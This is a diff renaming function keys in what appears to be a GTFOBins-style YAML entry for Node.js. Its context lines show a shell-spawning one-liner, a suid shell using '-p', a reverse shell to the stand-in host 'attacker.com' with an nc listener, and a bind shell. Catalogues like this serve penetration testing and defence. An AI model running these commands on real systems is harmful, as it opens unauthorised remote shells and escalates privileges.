@@ -1,6 +1,6 @@
 ---
 functions:
-  exec-interactive:
+  execute-interactive:
     - code: |
         node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]});'
   sudo-enabled:
@@ -9,7 +9,7 @@ functions:
   suid-enabled:
     - code: |
         ./node -e 'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]});'
-  reverse-shell:
+  reverse-shell-interactive:
     - description: Run `nc -l -p 12345` on the attacker box to receive the shell.
       code: |
         export RHOST=attacker.com
@@ -20,7 +20,7 @@ functions:
           sh.stdout.pipe(this);
           sh.stderr.pipe(this);
         });'
-  bind-shell:
+  bind-shell-interactive:
     - description: Run `nc target.com 12345` on the attacker box to connect to the shell.
       code: |
         export LPORT=12345
